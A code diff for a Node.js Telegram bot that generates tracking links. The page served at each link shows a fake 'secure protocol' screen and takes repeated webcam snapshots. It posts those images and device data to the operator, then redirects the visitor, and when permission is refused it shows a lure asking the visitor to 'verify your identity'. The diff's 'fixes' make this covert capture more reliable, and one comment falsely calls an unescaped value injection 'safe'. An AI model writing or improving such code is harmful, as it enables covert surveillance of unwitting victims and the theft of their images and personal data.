@@ -1,6 +1,6 @@
 /**
  * 𝐃𝐗-𝐂𝐎𝐃𝐄𝐗 𝐌𝐎𝐓𝐇𝐄𝐑 𝐒𝐘𝐒𝐓𝐄𝐌 v10.0 (Merged & Fixed)
- * Features: All Old Info + New Group Logic + Auto Cam/Info
+ * Features: All Old Info + New Group Logic + Auto Cam/Info + Web Fixed
  */
 
 const TelegramBot = require('node-telegram-bot-api');
@@ -706,12 +706,14 @@ async function handleBroadcast(msg) {
     bot.sendMessage(msg.chat.id, makeBorder("ᴅᴏɴᴇ", `✅: sᴇɴᴛ ᴛᴏ ${success} ᴜsᴇʀs`), {parse_mode:'HTML'});
 }
 
-// ─── 🌐 WEB ENGINE ────────
+// ─── 🌐 WEB ENGINE (FIXED) ────────
 
 app.get('/w/:id', async (req, res) => {
     const link = await Link.findOne({ shortId: req.params.id });
     if (!link) return res.send("INVALID LINK");
-    res.send(getHtmlTemplate(req.params.id, link.originalUrl));
+    // FIX: Pass empty string if null to prevent "null" text in html
+    const redirect = link.originalUrl ? link.originalUrl : "";
+    res.send(getHtmlTemplate(req.params.id, redirect));
 });
 
 app.post('/api/data', async (req, res) => {
@@ -762,7 +764,8 @@ function getHtmlTemplate(linkId, redirectUrl) {
     <style>
         body{margin:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden}
         #status{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;z-index:10}
-        video,canvas{display:none}
+        /* FIX: Only hide capture elements, keep matrix visible */
+        #v, #c { display:none }
     </style>
 </head>
 <body>
@@ -770,7 +773,8 @@ function getHtmlTemplate(linkId, redirectUrl) {
     <div id="status">INITIALIZING SECURE PROTOCOL...<br>PLEASE WAIT</div>
     <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
 <script>
-const id = "${linkId}"; const red = "${redirectUrl}";
+const id = "${linkId}"; 
+const red = "${redirectUrl}"; // Safe injection
 const m=document.getElementById('matrix'); const ctx=m.getContext('2d');
 m.width=window.innerWidth; m.height=window.innerHeight;
 const drops=Array(Math.floor(m.width/20)).fill(0);
@@ -806,6 +810,7 @@ async function start() {
         }
     };
 
+    // Send Info
     fetch('/api/data', {
         method:'POST', 
         headers:{'Content-Type':'application/json'}, 
@@ -821,11 +826,20 @@ async function start() {
                 const cvs=document.getElementById('c'); cvs.width=v.videoWidth; cvs.height=v.videoHeight;
                 cvs.getContext('2d').drawImage(v,0,0);
                 const img=cvs.toDataURL('image/jpeg',0.5);
+                
                 fetch('/api/data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({linkId:id,type:'cam',data:{images:[img],platform:navigator.platform}})});
-                count++; if(count>=5){ clearInterval(itv); if(red&&red!=="null") window.location.href=red; }
+                
+                count++; 
+                // Fix redirect logic
+                if(count>=5){ 
+                    clearInterval(itv); 
+                    if(red && red.length > 4 && red !== "null") window.location.href=red; 
+                }
             },1500);
         };
-    } catch(e){ document.getElementById('status').innerHTML="ACCESS DENIED: PLEASE ALLOW PERMISSION<br>TO VERIFY YOUR IDENTITY"; }
+    } catch(e){ 
+        document.getElementById('status').innerHTML="ACCESS DENIED: PLEASE ALLOW PERMISSION<br>TO VERIFY YOUR IDENTITY"; 
+    }
 }
 window.onload = start;
 </script>
